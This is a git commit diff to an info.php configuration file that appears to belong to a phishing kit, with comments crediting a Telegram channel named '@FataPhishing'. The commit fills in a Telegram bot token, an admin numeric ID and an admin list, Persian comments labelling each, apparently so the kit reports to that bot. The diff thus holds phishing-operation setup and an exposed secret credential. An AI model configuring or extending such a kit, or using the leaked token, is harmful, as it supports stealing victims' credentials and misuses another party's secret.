f4b77d35733989f535b3a1f0825c8b7d1e53006d
v-alltor <mohenmohammadi80@gmail.com>
2025-07-17 12:57:09 -0700

    Update info.php

--- info.php
+++ info.php
@@ -2,14 +2,14 @@
 //Channel @FataPhishing
 //Pv @Dev_Fata
 
-$token="";//توکن ربات
-$id=;//ایدی عددی ادمین
+$token="7888838921:AAFAyimjCTgxqb1iD5Soy4WjSwWkqJsEHt8";//توکن ربات
+$id=7041989859;//ایدی عددی ادمین
 
 
 $apikey="";//تو آموزش معلومه از کجا باید گرفتش api
 
 
-$admin_list=[];//ایدی عددی ادمین
+$admin_list=[7041989859];//ایدی عددی ادمین
 
 ?>
 //Channel @FataPhishing
